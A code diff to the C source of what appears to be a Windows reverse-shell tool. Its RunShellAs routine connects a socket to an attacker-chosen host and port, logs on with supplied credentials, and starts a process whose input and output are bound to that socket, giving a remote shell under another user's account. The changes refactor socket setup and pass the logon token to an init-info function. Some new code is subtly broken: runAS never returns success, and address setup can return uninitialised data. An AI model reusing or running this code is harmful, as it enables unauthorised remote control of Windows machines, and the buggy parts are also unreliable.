@@ -3,6 +3,8 @@
 #include <stdio.h>
 #include <userenv.h>
 #include <Lmcons.h>
+#include <iphlpapi.h>   // IPAddr
+#include <ws2tcpip.h>   // inet_pton
 
 #include "MgArguments.h"
 #include "Tools.h"
@@ -13,44 +15,56 @@
 #define DEFAULT_BUFLEN 1024
 #define MAX_ARG_LENGHT 65535
 
-#pragma warning(disable:4996)
+//#pragma warning(disable:4996)
 
-BOOL runAS(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, LPCWSTR appName, STARTUPINFOW si, PROCESS_INFORMATION* ProcessInfo) {
-    HANDLE    hToken;
-    LPVOID    lpvEnv;
-    WCHAR     szUserProfile[256] = L"";
-    DWORD     dwSize = sizeof(szUserProfile) / sizeof(WCHAR);
-    int retVal = 0;
+BOOL runAS(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, LPCWSTR appName, STARTUPINFOW si, PROCESS_INFORMATION* ProcessInfo, HANDLE * pHToken) {
+    BOOL retVal = FALSE;
+    HANDLE hToken;
 
     if (LogonUserW(lpszUsername, lpszDomain, lpszPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken)) {
+        LPVOID    lpvEnv;
+        
+        *pHToken = hToken;
         if (CreateEnvironmentBlock(&lpvEnv, hToken, TRUE)) {
+            WCHAR     szUserProfile[256] = L"";
+            DWORD     dwSize = sizeof(szUserProfile) / sizeof(WCHAR);
+
             if (GetUserProfileDirectoryW(hToken, szUserProfile, &dwSize)) {
                 if (!CreateProcessWithLogonW(lpszUsername, lpszDomain, lpszPassword, LOGON_WITH_PROFILE, NULL, (LPWSTR)appName, CREATE_UNICODE_ENVIRONMENT, lpvEnv, szUserProfile,&si, ProcessInfo))
-                    retVal = DisplayError(L"CreateProcessWithLogonW");
+                    printMsg(STATUS_ERROR, LEVEL_DEFAULT, "CreateProcessWithLogonW");
             }else
-                retVal = DisplayError(L"GetUserProfileDirectory");
+                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "GetUserProfileDirectory");
             if (!DestroyEnvironmentBlock(lpvEnv))
-                retVal =  DisplayError(L"DestroyEnvironmentBlock");
+                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "DestroyEnvironmentBlock");
         }else
-            retVal = DisplayError(L"CreateEnvironmentBlock");
-        CloseHandle(hToken);
+            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail CreateEnvironmentBlock");
     } else
-        retVal = DisplayError(L"LogonUser");
+        printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail LogonUser");
     return retVal;
 }
 
+SOCKADDR_IN InitSockAddr(char* ipAddress, int port) {
+    SOCKADDR_IN ssin;
+    IPAddr ipAddressF;
+
+    if (inet_pton(AF_INET, ipAddress, &ipAddressF)) {
+        memset(&ssin, 0, sizeof(SOCKADDR_IN));
+        ssin.sin_family = AF_INET;
+        ssin.sin_addr.s_addr = ipAddressF;
+        ssin.sin_port = htons(port);
+    }
+    return ssin;
+}
 BOOL RunShellAs(Arguments listAgrument) {
     BOOL exitPorcess = FALSE;
-    struct sockaddr_in sAddr;
+    SOCKADDR_IN sAddr;
 
     char* ipAddress = (char*)calloc(IP_ADDRESS_SIZE, sizeof(char));
     if (ipAddress == NULL)
         return FALSE;
     sprintf_s(ipAddress, IP_ADDRESS_SIZE, "%ws", listAgrument.host);
 
-    sAddr.sin_family = AF_INET;
-    sAddr.sin_addr.s_addr = inet_addr(ipAddress);
-    sAddr.sin_port = htons(listAgrument.port);
+    sAddr = InitSockAddr(ipAddress, listAgrument.port);
 
     printMsg(STATUS_INFO, LEVEL_DEFAULT, "Try to connect to server\n");
     while (!exitPorcess) {
@@ -60,9 +74,9 @@ BOOL RunShellAs(Arguments listAgrument) {
                 STARTUPINFOW StartupInfo;
                 PROCESS_INFORMATION ProcessInfo;
                 BOOL retVal;
+                HANDLE hToken = NULL;
 
                 printMsg(STATUS_OK, LEVEL_DEFAULT, "Connected to: %s:%i\n", ipAddress, listAgrument.port);
-                SendInitInfo(mySocket);
 
                 memset(&StartupInfo, 0, sizeof(STARTUPINFOW));
                 memset(&ProcessInfo, 0, sizeof(PROCESS_INFORMATION));
@@ -72,8 +86,11 @@ BOOL RunShellAs(Arguments listAgrument) {
                 StartupInfo.hStdOutput = (HANDLE)mySocket;
                 StartupInfo.hStdError = (HANDLE)mySocket;
 
+
                 retVal = runAS(listAgrument.lpszUsername, listAgrument.lpszDomain, listAgrument.lpszPassword,
-                    listAgrument.Process, StartupInfo, &ProcessInfo);
+                    listAgrument.Process, StartupInfo, &ProcessInfo, &hToken);
+
+                SendInitInfo(mySocket, hToken);
                 if (retVal == 0) {
                     WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
                     printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process shutdown !\n");
